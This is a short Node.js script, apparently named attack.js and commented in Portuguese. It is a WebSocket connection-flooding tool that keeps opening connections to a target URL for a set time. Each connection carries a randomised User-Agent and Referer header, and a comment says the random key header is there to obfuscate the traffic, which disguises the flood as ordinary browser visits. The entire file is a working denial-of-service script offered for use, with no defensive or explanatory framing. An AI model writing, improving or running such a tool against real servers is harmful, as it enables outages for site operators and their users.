const WebSocket = require('ws');
const crypto = require('crypto');

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15'
];

const referers = [
  'http://www.google.com',
  'http://www.yahoo.com',
  'http://www.bing.com',
  'http://www.ask.com',
  'http://www.duckduckgo.com',
  'http://www.baidu.com',
  'http://www.yandex.ru',
  'http://www.facebook.com',
  'http://www.twitter.com',
  'http://www.instagram.com',
  'http://www.linkedin.com',
  'http://www.pinterest.com',
  'http://www.reddit.com',
  'http://www.tumblr.com'
];

const getRandomElement = (array) => array[Math.floor(Math.random() * array.length)];

if (process.argv.length < 5) {
  console.log('Usage: node attack.js <url> <duration> <WebSockets>');
  process.exit(1);
}

const targetUrl = process.argv[2];
const attackDuration = parseInt(process.argv[3]) * 1000; // convertendo para milissegundos
const maxWebSockets = parseInt(process.argv[4]);

let requestCount = 0;
let activeWebSockets = 0;

const attack = setInterval(() => {
  if (Date.now() - startTime < attackDuration) {
    if (activeWebSockets < maxWebSockets) {
      const ws = new WebSocket(targetUrl, {
        headers: {
          'User-Agent': getRandomElement(userAgents),
          'Referer': getRandomElement(referers),
          'Sec-WebSocket-Key': crypto.randomBytes(16).toString('base64'), // Adiciona um header aleatório para ofuscar o tráfego
          'Sec-WebSocket-Version': '13' // Versão do protocolo WebSocket
        }
      });

      ws.on('open', () => {
        requestCount++;
        activeWebSockets++;
      });

      ws.on('error', (err) => {
        console.error(`Erro na conexão: ${err.message}`);
      });

      ws.on('close', () => {
        activeWebSockets--;
      });
    }
  } else {
    console.log(`Ataque encerrado. Total de conexões: ${requestCount}`);
    clearInterval(attack);
    process.exit();
  }
}, 100);

const startTime = Date.now();
